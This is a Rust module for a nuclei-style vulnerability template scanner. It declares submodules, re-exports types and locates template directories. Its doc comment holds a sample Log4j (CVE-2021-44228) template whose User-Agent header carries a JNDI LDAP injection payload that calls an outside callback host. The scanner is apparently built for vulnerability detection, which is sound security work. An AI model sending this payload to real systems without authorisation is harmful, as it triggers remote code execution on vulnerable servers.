//! Nuclei-style vulnerability template engine
//!
//! This module provides a template-based vulnerability scanning engine
//! inspired by Project Discovery's nuclei tool.
//!
//! ## Key Components
//!
//! - [`TemplateEngine`] - Main engine for executing templates against targets
//! - [`TemplateLoader`] - Loads and validates templates from YAML/JSON files
//! - [`TemplateMatcher`] - Matches template conditions against responses
//! - [`VulnerabilityTemplate`] - Template data structure
//!
//! ## Template Format
//!
//! Templates are defined in YAML format:
//!
//! ```yaml
//! id: CVE-2021-44228
//! info:
//!   name: Log4j Remote Code Execution
//!   author: slapper
//!   severity: critical
//!   tags:
//!     - cve
//!     - rce
//! matchers:
//!   - type: http
//!     path: "/"
//!     search:
//!       - pattern: "vulnerable"
//!         mode: word
//! requests:
//!   - method: GET
//!     path: "/"
//!     headers:
//!       User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
//! ```
//!
//! ## Usage
//!
//! ```rust,no_run
//! use slapper::scanner::templates::{TemplateEngine, TemplateLoader};
//! use std::path::PathBuf;
//!
//! # async fn example() -> slapper::error::Result<()> {
//! let loader = TemplateLoader::new(vec![PathBuf::from("templates/")]);
//! let executor = TemplateExecutor::new(loader)?;
//! let engine = TemplateEngine::new(executor);
//!
//! let results = engine.scan("https://example.com").await?;
//! for result in results {
//!     if result.matched {
//!         println!("Found: {} ({})", result.template_name, result.template_id);
//!     }
//! }
//! # Ok(())
//! # }
//! ```

pub mod executor;
pub mod loader;
pub mod marketplace;
pub mod matcher;
pub mod models;
pub mod verify;

pub use executor::{TemplateEngine, TemplateExecutionResult, TemplateExecutor};
pub use loader::TemplateLoader;
pub use marketplace::{TemplateMarketplace, MarketplaceTemplate, MarketplaceListing};
pub use matcher::{MatchResult, TemplateMatcher};
pub use models::{Matcher, VulnerabilityTemplate};
pub use verify::{SignedTemplate, SignerInfo, TemplateSigner, TemplateVerifier, VerificationResult};

use std::path::PathBuf;

pub fn default_templates_dir() -> Option<PathBuf> {
    directories::ProjectDirs::from("com", "slapper", "slapper")
        .map(|dirs| dirs.config_dir().join("templates"))
}

pub fn load_builtin_templates() -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Some(templates_dir) = default_templates_dir() {
        if templates_dir.exists() {
            paths.push(templates_dir);
        }
    }

    if let Ok(manifest_dir) = std::env::var("CARGO_MANIFEST_DIR") {
        let builtin = PathBuf::from(manifest_dir).join("templates");
        if builtin.exists() {
            paths.push(builtin);
        }
    }

    paths
}
